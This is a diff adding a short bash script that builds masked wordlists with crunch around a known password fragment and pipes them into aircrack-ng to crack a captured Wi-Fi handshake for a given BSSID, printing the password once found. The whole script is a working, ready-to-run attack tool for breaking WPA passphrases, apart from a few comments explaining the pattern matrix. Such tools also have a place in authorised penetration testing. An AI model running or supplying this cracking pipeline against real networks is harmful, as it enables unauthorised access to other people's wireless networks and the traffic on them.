@@ -1,0 +1,44 @@
+#!/bin/bash
+
+# This script is designed to make a matrix from the word.
+# Let's say you have a certainty that in password there is a word "ann",
+# And you want to make combinations with this word like:
+# ann1, ann12, ABCann123.....etc. 
+# Just set the word in 'word' variable and you can see below that matrix is already defined.
+# @ in every position will be replaced by one char from the charset group.
+curDir=$(pwd);
+word="makeMatrix"
+bssid="AA:BB:CC:DD:EE:FF"
+capFile="./captureFromAirodump*.cap"
+passFile="./aircrackPassFound.txt";
+# you can find charset list in your crunch directory typing command similar to:
+# cat /pentest/passwords/crunch/charset.lst
+charset="lalpha-numeric-space-sv";
+
+crunchDir="/pentest/passwords/crunch"
+wordLen=${#word};
+if [[ $wordLen < 4 ]]; then
+   echo "word can'b be shorten than 4 chars";
+   exit
+fi
+
+patternArray=("$word@" "$word@@" "$word@@@" "$word@@@@" \
+"@$word" "@@$word" "@@@$word" "@@@@$word" \
+"@$word@" "@$word@@" "@@$word@" "@$word@@@" "@@$word@@" "@@@$word@"
+);
+
+
+for pattern in ${patternArray[*]}
+do
+  pattLen=${#pattern}
+  if [[ $pattLen -lt 8 ]]; then
+    continue;
+  fi
+  echo $pattern
+  "$crunchDir/"crunch $pattLen $pattLen -f "$crunchDir/"charset.lst $charset -t $pattern -u \
+  | aircrack-ng -l $passFile -w - -b $bssid $capFile
+  if [[ -f "$passFile" ]]; then
+      echo "Password found: "$(cat $passFile);
+      exit;
+  fi
+done
